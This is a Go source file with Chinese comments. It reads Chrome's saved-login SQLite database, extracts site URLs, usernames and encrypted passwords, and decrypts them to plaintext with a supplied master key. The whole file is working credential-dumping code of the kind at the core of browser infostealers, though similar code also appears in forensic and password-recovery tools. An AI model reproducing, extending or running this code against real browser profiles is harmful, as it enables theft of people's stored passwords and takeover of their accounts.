package storage

import (
	"database/sql"
	"fmt"
	"time"

	"chrome/crypto"

	_ "modernc.org/sqlite" // 修改这里：使用纯 Go 实现的 SQLite 驱动
)

type LoginData struct {
	UserName   string
	Password   string
	LoginURL   string
	CreateDate time.Time
}

type ChromeDB struct {
	db *sql.DB
}

func NewChromeDB(dbPath string) (*ChromeDB, error) {
	db, err := sql.Open("sqlite", dbPath) // 修改这里：使用 "sqlite" 作为驱动名
	if err != nil {
		return nil, fmt.Errorf("打开数据库失败: %v", err)
	}
	return &ChromeDB{db: db}, nil
}

func (c *ChromeDB) Close() error {
	return c.db.Close()
}

func (c *ChromeDB) GetLoginData(masterKey []byte) ([]LoginData, error) {
	rows, err := c.db.Query(`SELECT origin_url, username_value, password_value, date_created FROM logins`)
	if err != nil {
		return nil, fmt.Errorf("查询数据失败: %v", err)
	}
	defer rows.Close()

	var results []LoginData
	for rows.Next() {
		var url, username string
		var pwd []byte
		var createDate int64

		if err := rows.Scan(&url, &username, &pwd, &createDate); err != nil {
			continue
		}

		password, err := crypto.DecryptPassword(masterKey, pwd) // 修改这里
		if err != nil {
			continue
		}

		results = append(results, LoginData{
			UserName:   username,
			Password:   password,
			LoginURL:   url,
			CreateDate: time.Unix(createDate/1000000, 0),
		})
	}

	return results, nil
}
